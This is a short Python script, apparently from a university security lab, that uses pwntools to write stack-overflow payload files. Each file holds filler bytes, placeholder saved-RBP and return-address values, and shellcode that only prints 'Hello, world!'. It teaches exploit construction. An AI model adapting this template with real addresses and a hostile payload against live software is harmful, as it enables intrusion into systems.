#!/usr/bin/env python3
# Simple Python script to generate shellcode for Lab5
# Nils, SUTD, 2016
# Z. TANG, SUTD, 2019

from pwn import *

lenfill = 28 # or some other value

# Hello World! payload - designed by Oka, 2014
payload = b'\xeb\x2a\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\xb8\x01\x00\x00\x00\xbf\x01\x00\x00\x00\x5e\xba\x0e\x00\x00\x00\x0f\x05\xb8\x3c\x00\x00\x00\xbf\x00\x00\x00\x00\x0f\x05\xe8\xd1\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c\x20\x77\x6f\x72\x6c\x64\x21'

# Set up return address. pwnlib is used to turn int to string

storedRBP = p64(0x4444444444444444) # DDDDDDDD in hex

# When running inside GDB
storedRIPgdb = p64(0x4545454545454545) # EEEEEEEE in hex

# When directly running on shell
storedRIP = p64(0x4545454545454545) # EEEEEEEE in hex

with open('payloadgdb','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIPgdb + payload)

with open('payload','wb') as f:
    f.write(b'A' * lenfill + storedRBP + storedRIP + payload)

